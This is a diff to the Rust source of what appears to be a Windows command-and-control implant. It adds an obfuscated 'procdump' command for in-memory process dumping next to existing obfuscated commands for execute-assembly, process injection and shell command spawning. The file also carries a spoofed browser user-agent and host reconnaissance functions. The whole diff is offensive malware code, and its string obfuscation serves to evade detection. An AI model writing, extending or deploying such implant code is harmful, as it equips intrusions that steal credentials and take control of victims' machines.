@@ -3,6 +3,8 @@ use std::os::windows::process::CommandExt;
 use std::time::Duration;
 use std::thread::sleep;
 use serde::{Serialize, Deserialize};
+use std::ffi::OsStr;
+use std::os::windows::ffi::OsStrExt;
 
 use crate::nonstd;
 
@@ -113,6 +115,7 @@ fn link_command(command: String) -> String {
     let args = arg_split.collect::<Vec<&str>>();
     // obfsscated args
     match args[0] {
+        a if (a == obfstr::obfstr!("procdump")) => nonstd::in_memory_dump(args),
         a if (a == obfstr::obfstr!("execute-assembly")) => nonstd::execute_assembly(args),
         a if (a == obfstr::obfstr!("inject")) => nonstd::process_injection(args),
         a if (a == obfstr::obfstr!("cmd")) => command_spawn(args),
@@ -247,7 +250,6 @@ fn hostname() -> String {
 }
 
 fn internal_ip() -> String {
-	use ifcfg;
     let mut iface_string = String::new();
     let ifaces = ifcfg::IfCfg::get().expect("no if");
     for inf in ifaces {
@@ -288,4 +290,8 @@ fn integrity() -> String {
 // dynamic with build env var
 fn user_link() -> String {
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko".to_string()
+}
+
+pub fn get_wide(s: &str) -> Vec<u16> {
+    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
 }
